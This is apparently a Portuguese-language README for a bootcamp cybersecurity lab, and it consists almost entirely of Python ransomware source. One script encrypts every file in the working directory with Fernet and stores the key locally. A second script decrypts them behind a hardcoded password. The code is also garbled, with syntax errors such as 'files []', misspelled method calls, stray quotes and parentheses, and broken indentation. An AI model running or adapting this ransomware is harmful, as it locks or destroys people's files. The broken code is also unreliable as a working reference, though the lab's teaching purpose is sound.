# Lab-Ransomware-
Esse lab foi feito para resolução do desafio do bootcamp de cybersecurity do Santander em parceria com DIO.

#Código utilizado para criação do malware:
#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

files []

for file in os.listdir():
         if file == "malware.py" or file == "thekey.key" or file" == "decrypt.py":
                continue
         if os.path.isfile(file):
                  files.appened(file)

print ("Encrypted files:", files)

key =  Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
         thekey.write(key)

for file in files:
        with open(file, "rb") as thefile:
  
             content = thefile.read()
      content_encrypt = Fernet(key).encrypt(content)
      with open(file), "wb") as thefile:
              thefile.write(content_encrypt)

print("All your files has been encrypted!")

#Código para Descriptografar:

#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet

files []


for file in os.listdir():
         if file == "malware.py" or file == "thekey.key" or file" == "decrypt.py":
                continue
         if os.path.isfile(file):
                  files.appened(file)
                  print (files)


with open("thekey.key", "rb") as key:
         secretkey = key.read()
passphrase = "CyberSec"
upassword = input ( "Enter the password to decrypt your files:")
  
if upassword == passphrase:
       for file in files:
             with open(file, "rb") as thefile:
                content == thefile.read()
          content_decrypt = Fernet(secretkey).decrypt(content)


        with open(file, "wb") as thefile:
              thefile.write(content_decrypt)
print("You recovered all your files")

else: print("Enter the right password to recover your files:")
